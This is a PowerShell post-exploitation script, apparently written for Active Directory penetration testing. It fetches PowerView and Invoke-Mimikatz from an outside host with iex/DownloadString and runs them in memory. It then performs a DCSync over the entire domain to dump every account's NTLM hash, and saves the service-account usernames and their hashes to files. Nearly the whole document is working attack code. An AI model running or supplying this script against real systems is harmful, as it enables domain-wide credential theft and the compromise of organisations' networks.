# LOAD POWERVIEW INTO MEMORY
iex(new-Object Net.WebClient).DownloadString('https://lrvt.de/dl/PowerView.ps1');Get-NetDomain;

# LOAD MIMIKATZ INTO MEMORY
iex(new-Object Net.WebClient).DownloadString('https://lrvt.de/dl/Invoke-Mimikatz.ps1')

# GET SPN SAMACCOUTNAMES ONLY & LOG RESULTS
Get-DomainUser -SPN > spnuser_fulldetails.txt
Get-DomainUser -SPN | Select-Object -property samaccountname | foreach { $_.samaccountname } > spnuser_samaccountname.txt

# DO FULL DCSYNC OVER FULL DOMAIN & LOG RESULTS
$DATE = $(get-date -f yyyyMMddThhmm)
$LOG = $DATE + "_" + "DCSync_NTLM_full.txt"
$LOGSPN = $DATE + "_" + "DCSYNC_SPN_NTHASH.txt"
$DOMAIN = get-netdomain | Select-Object -property Name | foreach { $_.Name}

write-host "[!!!] DCSync will be executed on" $DOMAIN -ForegroundColor Red

$command = '"log ' + $LOG + '" "lsadump::dcsync /domain:'+ $DOMAIN +' /all /csv"'
Invoke-Mimikatz -Command $command

# GET SPN USERS ONLY AS LOOP VAR
$loop = Get-DomainUser -SPN | Select-Object -property samaccountname | foreach { $_.samaccountname }

# LOOP OVER DCSYNC FULL AND FILTER FOR SPN USER & LOG RESULTS
foreach ($spn in $loop) {
get-content $LOG -ReadCount 1000 |
    foreach { $_ -match $spn } >> $LOGSPN
}

# get NTLM only
$HASHES = $DATE + "_" + "SPN_Hashes_Only_FINAL.txt"
(Get-Content -LiteralPath $LOGSPN) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES

# get users only
$USERS = $DATE + "_" + "SPN_Users_Only_FINAL.txt"
(Get-Content -LiteralPath $LOGSPN) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS

# VERIFY AMOUNT OF SPN AND DSYNCED SPNS
write-host "Found SPNs:" (Get-Content "spnuser_samaccountname.txt" | Select-Object -property samaccountname | foreach { $_.samaccountname }).Length "(minus 1 for Guest account)" -ForegroundColor Red; write-host "DCsynced SPNs:" (Get-Content $LOGSPN).Length -ForegroundColor Red
